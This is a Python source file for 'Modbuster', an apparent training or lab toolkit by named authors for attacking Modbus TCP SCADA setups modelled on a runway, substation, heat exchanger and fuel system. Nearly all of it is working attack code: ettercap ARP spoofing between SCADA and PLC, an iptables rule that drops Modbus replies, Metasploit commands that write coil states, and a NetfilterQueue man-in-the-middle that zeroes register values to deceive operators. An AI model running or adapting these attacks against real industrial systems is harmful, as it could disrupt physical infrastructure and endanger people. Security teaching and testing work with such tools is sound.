import os
import subprocess
import time
import sys
import importlib
import nm_config
import shutil
from scapy.all import *
from netfilterqueue import NetfilterQueue

def setconfig():
    print("\n=== Load Configuration File ===")
    print("1) Runway")
    print("2) Substation")
    print("3) Heat Exchanger")
    print("4) Fuel Management")
    print("q) Return to Main Menu")
    select = input(">> ").strip().lower()
    
    profiles = {
        "1": "runway",
        "2": "substation",
        "3": "heatex",
        "4": "fuelman"
    } 
    
    if select in profiles:
        source = f"./scadaconf/{profiles[select]}"
        destination = "./nm_config.py"
        
        try:
            if os.path.exists(source):
                shutil.copy2(source, destination)
                importlib.reload(nm_config)
                print(f"\n[+] Successfully loaded {profiles[select]} configuration")
            else:
                print(f"\n[!] Error: Source file {source} not found.")
                
        except Exception as e:
            print(f"\n[!] Failed to copy configuration: {e}")
            
        time.sleep(1)
        main()

    elif select == "q":
        main()
    else:
        print("Invalid selection")
        time.sleep(1)
        setconfig()

def clear():
    subprocess.run(["clear"], check=True)
    
def etterspoof():
    print("Checking ettercap...")
    if subprocess.getoutput("pgrep -x -c ettercap") == "0":
        print("\n\nEttercap is not enabled. Activating ARP Spoofing...\n\n")
        intrfce = input("Enter Interface Name: ") 

        cmd = ["ettercap", "-Tq", "-i", intrfce, "-M", f"arp:remote", f"{nm_config.scada_mac}/{nm_config.scada_ip}//", f"{nm_config.modcli_mac}/{nm_config.modcli_ip}//"]
        print(f"Executing: {' '.join(cmd)}")
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, start_new_session=True)
        time.sleep(5)
    else:
        print("Ettercap is already running!")
        time.sleep(1)
    clear()
    main()

def dos():
    def firewall():
        print("Selected DoS variation: Modbus Firewall\n")
        print("Select a firewall state\n")
        print("1) On (Blocking Traffic)")
        print("2) Off (Return to default)")
        print("q) Return to DoS Menu")
        select = input(">> ")
        
        if select == "1":
            subprocess.run(["iptables", "-A", "OUTPUT", "-p", "tcp", "-s", nm_config.modcli_ip, "--sport", nm_config.mod_port, "-j", "DROP"], check=True)
            main()
        elif select == "2":
            subprocess.run(["iptables", "-F"], check=True)
            main()
        elif select == "q":
            dos()
        else:
            firewall()

    try:
        print("Selected option: DoS Attack\n")
        print("1) SYN Flood\n2) Modbus Firewall\nq) Return")
        select = input(">> ")
        if select == "1":
            print("\nNot yet implemented...sorry")
            time.sleep(1)
            dos()
        elif select == "2":
            firewall()
        elif select == "q":
            main()
        else:
            main()
    except KeyboardInterrupt:
        main()

def traffic():
    def capture(packet):
        clear()
        print("Modbus Packet captured")
        hexdump(packet)
        if packet.haslayer(Raw):
            print("\nPacket Raw Load\n")
            print(str(packet[Raw].load) + "\n")
        print("\n-------------------------------------------------------------\n")
        print("Press CTRL + C to Exit")

    try:
        sniff(filter="port "+ nm_config.mod_port +" and src host "+ nm_config.modcli_ip+"", prn=capture, store=0)
        main()
    except KeyboardInterrupt:
        print("Exiting...")
        time.sleep(0.5)
        main()

def test():
    try:
        sniff(store=0, prn=lambda x: x.summary())
        main()
    except KeyboardInterrupt:
        print("Exiting...")
        time.sleep(0.5)
        main()

def msfconsole():
    try:
        coil_address = input("Enter Coil Address: ")
        num_coils = int(input("Enter # of Coils: "))
        coil_data = "".join([input(f"Enter state [0/1] for Coil #{x}: ") for x in range(num_coils)])

        msf_commands = (
            f"use auxiliary/scanner/scada/modbusclient; "
            f"set RHOSTS {nm_config.modcli_ip}; "
            f"set action WRITE_COILS; "
            f"set NUMBER {num_coils}; "
            f"set RPORT {nm_config.mod_port}; "
            f"set DATA_COILS {coil_data}; "
            f"set DATA_ADDRESS {coil_address}; "
            f"run; exit"
        )

        subprocess.run(["msfconsole", "-q", "-x", msf_commands], check=True)
    except Exception as e:
        print(f"Error: {e}")
    main()

def fool():
    def nf_logic(queue_num, payload_func):
        subprocess.run(["iptables", "-A", "OUTPUT", "-p", "tcp", "-s", nm_config.modcli_ip, "--sport", nm_config.mod_port, "-j", "NFQUEUE", "--queue-num", str(queue_num)], check=True)
        nfqueue = NetfilterQueue()
        nfqueue.bind(queue_num, payload_func)
        try:
            print("Intercepting...")
            nfqueue.run()
        except KeyboardInterrupt:
            subprocess.run(["iptables", "-F"], check=True)
            main()
        finally:
            nfqueue.unbind()

    def callback_clear(packet):
        pkt = IP(packet.get_payload())
        if pkt.haslayer(Raw):
            bytecnt = pkt[Raw].load[8]
            pkt[Raw].load = pkt[Raw].load[:9] + int(bytecnt/2)*b'\x00\x00'
            del pkt[IP].len; del pkt[IP].chksum; del pkt[TCP].chksum
        packet.drop()
        send(pkt)

    print("1) Randomize\n2) Preserve\n3) Clear\nq) Return")
    choice = input(">> ")
    if choice == "3":
        nf_logic(0, callback_clear)
    else:
        main()

def main():
    clear()
    print(""" 
---------------------------------------------
       __   __   __        __  ___  ___  __  
 |\/| /  \ |  \ |__) |  | /__`  |  |__  |__) 
 |  | \__/ |__/ |__) \__/ .__/  |  |___ |  \ 
                                             
---------------------------------------------
    
NCREPT ModbusTCP Python 3.9 Script
by Gideon
modified by Jesse Cutshall
    
    \n""")
    
    time.sleep(0.5)
    
    print("Select a function from the options below\n")
    print("1) Write to Coils/Holding Registers")
    print("2) Fool SCADA ")
    print("3) DoS Attack")
    print("4) View ModbusTCP Traffic")
    print("5) Test Traffic Function (View All Traffic)")
    print("6) Enable ARP Spoofing")
    print("7) Set Configuration File ")
    print("q) Exit Modbuster")
    
    try:
        select = input(">> ")
        if select == "1":
            msfconsole()
        elif select == "2":
            fool()
        elif select == "3":
            dos()
        elif select == "4":
            traffic()
        elif select == "5":
            test()
        elif select == "6":
            etterspoof()
        elif select == "7":
            setconfig()
        elif select == "q":
            sys.exit(1)
        else:
            print("Invalid option\n")
            time.sleep(1.5)
            main()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(1)

if __name__ == "__main__":
    main()
